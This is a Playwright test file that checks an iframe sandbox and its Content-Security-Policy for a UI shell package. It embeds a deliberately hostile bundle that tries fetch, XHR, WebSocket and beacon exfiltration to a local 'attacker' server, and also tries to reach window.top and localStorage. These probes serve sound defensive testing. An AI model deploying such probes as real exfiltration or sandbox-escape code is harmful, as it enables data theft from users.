import { expect, test } from '@playwright/test';
import { readFileSync } from 'node:fs';
import { type Server, createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import { join } from 'node:path';

import {
  SURFACE_SANDBOX_CSP,
  SURFACE_SANDBOX_IFRAME_FLAGS,
  buildSandboxDocument,
} from '../../../packages/surface-shell/src/sandbox/document';

/**
 * Proves the web sandbox posture in a real browser, with the REAL shell
 * artifact and the host's real document assembly:
 * 1. a hostile bundle attempting fetch/XHR/WebSocket/beacons reaches a real
 *    attacker server ZERO times, and the harness stays alive;
 * 2. with the sandbox CSP removed, every one of those probes DOES reach it
 *    — the control without which (1) proves nothing;
 * 3. `window.top` and `localStorage` are refused, with the opaque origin
 *    shown to be the reason by granting `allow-same-origin` and watching
 *    both escapes succeed;
 * 4. the Session-3 poll fixture runs end-to-end through the iframe:
 *    render → state update re-render → tap → invoke message → permission
 *    off disables.
 *
 * METHODOLOGY (D43, and the standard this suite failed to meet until
 * D171). Egress verdicts are decided at a real listening server, never by
 * a `catch` inside the frame. The previous version of this file pointed
 * every probe at `https://beacon.invalid/`, an RFC-6761 name that can
 * never resolve: each probe's "blocked" branch was the branch a DNS
 * failure takes, and the network-level backstop was satisfied by DNS
 * failure too. It would have passed unchanged if the sandbox CSP had
 * stopped working. Three properties replace that:
 *
 *   - a blocked verdict is ZERO connections observed at an attacker that
 *     is listening and would have answered;
 *   - every probe posts `probe-armed` before firing, so a frame that never
 *     ran cannot be mis-scored as blocked;
 *   - the CSP-removed arm is a peer test, not a comment: if the probes
 *     stop being able to reach the attacker at all, that test fails and
 *     the instrument is known to be broken.
 *
 * The host page is served from a real origin for the same reason. On
 * `about:blank` the parent has an opaque origin of its own, which confounds
 * the `window.top`/`localStorage` probes: their refusal cannot be
 * attributed to the sandbox's opaque origin when the parent has one too.
 */

const shellRoot = join(__dirname, '..', '..', '..', 'packages/surface-shell');

function readShell() {
  try {
    return {
      js: readFileSync(join(shellRoot, 'dist/surface-shell.js'), 'utf8'),
      css: readFileSync(join(shellRoot, 'dist/surface-shell.css'), 'utf8'),
    };
  } catch {
    throw new Error(
      'shell artifact missing — run `pnpm build:surface-shell` at the repo root first'
    );
  }
}

function readPollFixture() {
  const dir = join(shellRoot, 'fixtures/poll');
  return {
    bundle: readFileSync(join(dir, 'app.js'), 'utf8'),
    spec: JSON.parse(readFileSync(join(dir, 'spec.json'), 'utf8')),
    state: JSON.parse(readFileSync(join(dir, 'state.json'), 'utf8')),
  };
}

// ---------------------------------------------------------------------------
// the attacker, and a host page with a real origin
// ---------------------------------------------------------------------------

type Hit = { path: string; at: number };

let hostServer: Server;
let attackerServer: Server;
let hostOrigin = '';
let attackerOrigin = '';
const hits: Hit[] = [];

function listen(server: Server): Promise<number> {
  return new Promise((resolve) => {
    server.listen(0, '127.0.0.1', () =>
      resolve((server.address() as AddressInfo).port)
    );
  });
}

function close(server: Server): Promise<void> {
  return new Promise((resolve) => server.close(() => resolve()));
}

test.beforeAll(async () => {
  attackerServer = createServer((req, res) => {
    hits.push({ path: req.url ?? '', at: Date.now() });
    res.writeHead(200, {
      'content-type': 'text/plain; charset=utf-8',
      'access-control-allow-origin': '*',
    });
    res.end('exfil-landed');
  });
  // A WebSocket handshake never reaches the request handler — node routes
  // it to 'upgrade'. Without this listener a WebSocket that connected
  // would leave no trace and score as blocked, which is the whole class of
  // bug this rewrite exists to remove.
  attackerServer.on('upgrade', (req, socket) => {
    hits.push({ path: req.url ?? '', at: Date.now() });
    socket.destroy();
  });
  const attackerPort = await listen(attackerServer);
  // a different host AND port from the host page, so no same-origin or
  // `'self'` relaxation can accidentally admit it
  attackerOrigin = `http://localhost:${attackerPort}`;

  hostServer = createServer((_req, res) => {
    res.writeHead(200, {
      'content-type': 'text/html; charset=utf-8',
      'cache-control': 'no-store',
    });
    res.end(
      '<!doctype html><html><head><meta charset="utf-8" /><title>sandbox host</title></head><body style="margin:0"></body></html>'
    );
  });
  const hostPort = await listen(hostServer);
  hostOrigin = `http://127.0.0.1:${hostPort}`;
});

test.afterAll(async () => {
  await close(attackerServer);
  await close(hostServer);
});

/** probe name → the attacker path that names it in the hit log */
const EGRESS_PROBE_PATHS = {
  fetch: '/fetch',
  xhr: '/xhr',
  websocket: '/ws',
  imageBeacon: '/pixel.gif',
  sendBeacon: '/b',
} as const;

function hitsSince(since: number, path: string): number {
  return hits.slice(since).filter((hit) => hit.path === path).length;
}

/**
 * Every probe aims at the real attacker. The in-frame `results` strings are
 * kept as corroboration — they say which layer refused — but they decide
 * nothing: the verdict is the hit count at the server.
 */
function hostileBundle(attacker: string): string {
  const wsOrigin = attacker.replace(/^http/, 'ws');
  return `
(function () {
  // armed before anything fires: a frame that never loaded must not be
  // read as a frame whose every probe was blocked
  parent.postMessage(JSON.stringify({ type: 'probe-armed' }), '*');

  const results = {};
  const report = () => parent.postMessage(
    JSON.stringify({ type: 'probe-results', results }), '*'
  );
  const probes = [];

  probes.push(
    fetch(${JSON.stringify(`${attacker}/fetch`)})
      .then(() => { results.fetch = 'succeeded'; })
      .catch(() => { results.fetch = 'blocked'; })
  );

  try {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', ${JSON.stringify(`${attacker}/xhr`)});
    xhr.onerror = () => { results.xhr = 'blocked'; };
    xhr.onload = () => { results.xhr = 'succeeded'; };
    xhr.send();
    probes.push(new Promise((resolve) => setTimeout(resolve, 400)));
  } catch (e) {
    results.xhr = 'blocked';
  }

  try {
    const ws = new WebSocket(${JSON.stringify(`${wsOrigin}/ws`)});
    ws.onerror = () => { results.websocket = 'blocked'; };
    ws.onopen = () => { results.websocket = 'succeeded'; };
    probes.push(new Promise((resolve) => setTimeout(resolve, 400)));
  } catch (e) {
    results.websocket = 'blocked';
  }

  probes.push(new Promise((resolve) => {
    const img = new Image();
    img.onerror = () => { results.imageBeacon = 'blocked'; resolve(); };
    img.onload = () => { results.imageBeacon = 'succeeded'; resolve(); };
    img.src = ${JSON.stringify(`${attacker}/pixel.gif`)};
    setTimeout(resolve, 400);
  }));

  // navigator.sendBeacon returns true when the UA merely QUEUES the
  // payload, so its return value was never an egress signal. Against a
  // real listening attacker the transmission itself is observable, which
  // is what the assertion now reads.
  try {
    results.sendBeacon = navigator.sendBeacon
      ? navigator.sendBeacon(${JSON.stringify(`${attacker}/b`)}, 'x')
        ? 'queued'
        : 'refused'
      : 'unavailable';
  } catch (e) {
    results.sendBeacon = 'threw';
  }

  try {
    void window.top.document.title;
    results.topAccess = 'succeeded';
  } catch (e) {
    results.topAccess = 'blocked';
  }

  try {
    window.localStorage.getItem('x');
    results.storage = 'succeeded';
  } catch (e) {
    results.storage = 'blocked';
  }

  Promise.all(probes).then(() => {
    report();
    // and prove the harness is still alive after all that
    surface.register({
      render: function (state) {
        return surface.html\`<div class="still-alive">harness alive</div>\`;
      },
    });
  });
})();
`;
}

async function mountSandbox(
  page: import('@playwright/test').Page,
  doc: string,
  flags: string = SURFACE_SANDBOX_IFRAME_FLAGS
) {
  await page.goto(`${hostOrigin}/host.html`);
  await page.evaluate(
    ({ doc, flags }) => {
      const w = window as unknown as { __received: unknown[] };
      w.__received = [];
      window.addEventListener('message', (event) => {
        const frame = document.querySelector('iframe');
        if (frame && event.source === frame.contentWindow) {
          let data: unknown = event.data;
          if (typeof data === 'string') {
            try {
              data = JSON.parse(data);
            } catch {
              return;
            }
          }
          w.__received.push(data);
        }
      });
      const iframe = document.createElement('iframe');
      iframe.setAttribute('sandbox', flags);
      iframe.setAttribute('srcdoc', doc);
      iframe.style.width = '800px';
      iframe.style.height = '600px';
      iframe.style.border = '0';
      document.body.appendChild(iframe);
    },
    { doc, flags }
  );
}

async function received(page: import('@playwright/test').Page) {
  return page.evaluate(
    () => (window as unknown as { __received: unknown[] }).__received
  );
}

async function waitForMessage(
  page: import('@playwright/test').Page,
  type: string
) {
  await expect
    .poll(
      async () =>
        (await received(page)).some(
          (message) => (message as { type?: string }).type === type
        ),
      { message: `the sandbox frame never posted \`${type}\`` }
    )
    .toBe(true);
}

async function probeResults(page: import('@playwright/test').Page) {
  const message = (await received(page)).find(
    (entry) => (entry as { type?: string }).type === 'probe-results'
  ) as { results: Record<string, string> };
  return message.results;
}

/**
 * A bounded wait for the ABSENCE of a connection. There is no event to
 * await for "the request that was never issued", so the probes' own 400ms
 * timers are given room to expire and any in-flight connection room to
 * land before the hit log is read.
 */
async function settle(page: import('@playwright/test').Page) {
  await page.waitForTimeout(800);
}

/**
 * The real document minus exactly the one line that carries the policy.
 * Asserting the removal happened keeps the control from silently becoming
 * a second copy of the enforced arm if the meta tag's spelling changes.
 */
function withoutSandboxCsp(doc: string): string {
  const meta = `<meta http-equiv="Content-Security-Policy" content="${SURFACE_SANDBOX_CSP}" />`;
  expect(
    doc,
    'the sandbox document no longer carries the CSP meta this control removes'
  ).toContain(meta);
  const stripped = doc.replace(meta, '');
  expect(stripped).not.toContain('Content-Security-Policy');
  return stripped;
}

// ---------------------------------------------------------------------------

test('hostile bundle: no egress reaches the attacker; harness survives', async ({
  page,
}) => {
  const before = hits.length;
  const shell = readShell();
  // Playwright's 'request' event fires on ATTEMPTS, CSP-blocked ones
  // included — so the browser-side corroboration is that no attacker
  // request ever completed. The authoritative signal is the server's.
  const succeeded: string[] = [];
  page.on('response', (response) => succeeded.push(response.url()));
  page.on('requestfinished', (request) => succeeded.push(request.url()));

  const doc = buildSandboxDocument({
    shellJs: shell.js,
    shellCss: shell.css,
    bundleSource: hostileBundle(attackerOrigin),
  });
  await mountSandbox(page, doc);

  await waitForMessage(page, 'probe-armed');
  await waitForMessage(page, 'probe-results');
  await settle(page);

  // THE assertion: a listening server that would have answered saw nothing
  for (const [name, path] of Object.entries(EGRESS_PROBE_PATHS)) {
    expect(
      hitsSince(before, path),
      `${name} reached the attacker at ${path}`
    ).toBe(0);
  }
  expect(
    succeeded.filter((url) => url.startsWith(attackerOrigin)),
    'a request to the attacker origin completed in the browser'
  ).toEqual([]);

  // corroboration: which layer refused, per probe
  const results = await probeResults(page);
  expect(results.fetch).toBe('blocked');
  expect(results.xhr).toBe('blocked');
  expect(results.websocket).toBe('blocked');
  expect(results.imageBeacon).toBe('blocked');
  expect(results.topAccess).toBe('blocked');
  expect(results.storage).toBe('blocked');

  // the harness posted ready and still renders after the probes
  const ready = (await received(page)).find(
    (message) => (message as { type?: string }).type === 'ready'
  );
  expect(ready).toMatchObject({ shellVersion: 1, protocolVersion: 1 });

  await page.evaluate(
    (serialized) => {
      document
        .querySelector('iframe')
        ?.contentWindow?.postMessage(serialized, '*');
    },
    JSON.stringify({
      type: 'init',
      protocolVersion: 1,
      spec: { surfaceId: 's', specRevision: 1, actions: {} },
      state: {},
      theme: 'light',
      canInvoke: false,
    })
  );
  await expect(page.frameLocator('iframe').locator('.still-alive')).toHaveText(
    'harness alive'
  );
});

test('control: with the sandbox CSP removed, every probe reaches the attacker', async ({
  page,
}) => {
  const before = hits.length;
  const shell = readShell();
  const doc = withoutSandboxCsp(
    buildSandboxDocument({
      shellJs: shell.js,
      shellCss: shell.css,
      bundleSource: hostileBundle(attackerOrigin),
    })
  );
  await mountSandbox(page, doc);

  await waitForMessage(page, 'probe-armed');
  await waitForMessage(page, 'probe-results');
  await settle(page);

  for (const [name, path] of Object.entries(EGRESS_PROBE_PATHS)) {
    expect(
      hitsSince(before, path),
      `${name} did not reach the attacker even with the CSP removed — the probe is broken, so the enforced arm proves nothing about ${name}`
    ).toBeGreaterThan(0);
  }
});

test('control: the opaque origin is what refuses window.top and localStorage', async ({
  page,
}) => {
  const shell = readShell();
  const doc = buildSandboxDocument({
    shellJs: shell.js,
    shellCss: shell.css,
    bundleSource: hostileBundle(attackerOrigin),
  });
  // The one flag the shipped document withholds. Granting it on a host
  // page with a REAL origin gives the srcdoc frame that origin, and both
  // escapes become observable — which is what makes their refusal in the
  // enforced arm attributable to the missing flag rather than to a parent
  // that had nothing worth reaching.
  await mountSandbox(page, doc, 'allow-scripts allow-same-origin');

  await waitForMessage(page, 'probe-armed');
  await waitForMessage(page, 'probe-results');

  const results = await probeResults(page);
  expect(
    results.topAccess,
    'window.top stayed unreachable with allow-same-origin granted — the enforced arm cannot attribute its refusal to the opaque origin'
  ).toBe('succeeded');
  expect(
    results.storage,
    'localStorage stayed unreachable with allow-same-origin granted — same confound'
  ).toBe('succeeded');
});

test('poll fixture end-to-end through the real iframe host document', async ({
  page,
}) => {
  const shell = readShell();
  const poll = readPollFixture();
  const doc = buildSandboxDocument({
    shellJs: shell.js,
    shellCss: shell.css,
    bundleSource: poll.bundle,
  });
  await mountSandbox(page, doc);

  await waitForMessage(page, 'ready');

  const post = async (message: unknown) => {
    await page.evaluate((serialized) => {
      document
        .querySelector('iframe')
        ?.contentWindow?.postMessage(serialized, '*');
    }, JSON.stringify(message));
  };

  await post({
    type: 'init',
    protocolVersion: 1,
    spec: poll.spec,
    state: poll.state,
    theme: 'dark',
    canInvoke: true,
  });

  const frame = page.frameLocator('iframe');
  await expect(frame.locator('.tsh-card-title')).toHaveText(
    'What should we get for lunch?'
  );
  // one vote in fixture state
  await expect(frame.locator('.tsh-stat-value')).toHaveText('1');

  // state update re-renders
  await post({
    type: 'state',
    state: {
      ...poll.state,
      votes: { '~zod': 'pizza', '~ten': 'tacos', '~bus': 'pizza' },
    },
  });
  await expect(frame.locator('.tsh-stat-value')).toHaveText('3');

  // tap → invoke with actionId + rendered revision
  await frame.locator('.tsh-list-row button').first().click();
  await expect
    .poll(async () =>
      (await received(page)).find(
        (message) => (message as { type?: string }).type === 'invoke'
      )
    )
    .toEqual({
      type: 'invoke',
      actionId: 'vote-pizza',
      specRevision: poll.spec.specRevision,
    });

  // permission off disables live
  await post({ type: 'permission', canInvoke: false });
  await expect(frame.locator('.tsh-list-row button').first()).toBeDisabled();
});
